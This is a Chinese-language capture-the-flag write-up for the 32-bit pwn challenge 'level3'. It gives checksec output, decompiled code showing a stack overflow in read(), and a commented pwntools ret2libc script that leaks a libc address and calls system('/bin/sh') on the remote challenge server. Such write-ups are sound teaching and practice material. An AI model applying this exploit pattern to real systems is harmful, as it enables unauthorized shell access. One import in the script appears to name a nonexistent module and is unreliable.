1. checksec

   ```
   ┌──(root㉿kali)-[/home/kali/Desktop]
   └─# checksec ./level3 
   [*] '/home/kali/Desktop/level3'
       Arch:     i386-32-little
       RELRO:    Partial RELRO
       Stack:    No canary found
       NX:       NX enabled
       PIE:      No PIE (0x8048000)
   ```
   栈不可执行保护开启，栈溢出保护未开启
2. IDA静态分析

   ```
   int __cdecl main(int argc, const char **argv, const char **envp)
   {
     vulnerable_function();
     write(1, "Hello, World!\n", 0xEu);
     return 0;
   }
   ```
   跟随vulnerable_function函数

   ```
   ssize_t vulnerable_function()
   {
     char buf[136]; // [esp+0h] [ebp-88h] BYREF

     write(1, "Input:\n", 7u);
     return read(0, buf, 0x100u);
   }
   ```
   显然，利用read函数实现栈溢出但是函数列表中无直接的后门函数，而题目中给了libc文件，通过调用libc库中的system函数获取shell
3. 利用脚本以及思路

   ```
   # 导入需要的库
   from pwn import *
   from pwn_p64 import *

   # 创建远程对象
   io = remote("61.147.171.105", 59320)

   # 获取本地文件对象和libc库对象
   elf = ELF('/home/kali/Desktop/level3')
   libc = ELF('/home/kali/Desktop/libc_32.so.6')

   # 获取用到的函数
   write_plt = elf.plt['write']
   write_got = elf.got['write']
   main_addr = elf.sym['main']

   # 收到数据后会调用read函数，等待我们输入payload
   io.recvuntil(":\n")

   # 第一步利用，write函数调用过一次，got重定位完成，利用write函数泄露libc基址
   payload = b'a' * 0x88                           # 栈的大小
   payload += b'a' * 4                             # 汇编代码中，该函数结尾有leave指令，即函数有过push ebp的操作，覆盖ebp
   # 此处浅析一下为什么这部操作不会破坏栈结构，leave指令相当于 rsp=rbp，pop rbp（rbp=0x61616161），rsp是正常的，但rbp坏掉了，
   # 但在接下来的其他的函数调用中，关于栈的指令是 push rbp ，rbp=rsp，也就是说在溢出函数后调用的函数的栈都是正常的只是溢出函数的栈底变化了而已
   payload += p32(write_plt)                       # 劫持函数返回地址到write函数
   payload += p32(main_addr)                       # write函数的返回地址是main函数,至于为什么main函数是write函数的返回地址是因为，leave指令
   						# 恢复了栈，main_addr恰好在栈顶，retn=pop rip，rip=main_addr
   payload += p32(1) + p32(write_got) + p32(4)     # 泄露got表write的全局偏移地址
   io.sendline(payload)

   # 获取libc基址以及system函数地址
   write_got_addr = u32(io.recv())
   libc_base = write_got_addr-libc.sym['write']
   system_addr = libc_base+libc.sym['system']

   # 计算字符串/bin/sh的地址，0x15902b为偏移，通过命令：strings -a -t x libc_32.so.6 | grep "/bin/sh" 获取
   bin_sh_addr = libc_base + 0x15902b

   # 再次利用，跳转到system函数
   payload2 = b'a' * 0x88 + p32(0xdeadbeef) + p32(system_addr) + p32(0xdeedbeef) + p32(bin_sh_addr)

   # end
   io.recvuntil(":\n")
   io.sendline(payload2)
   io.interactive()
   ```
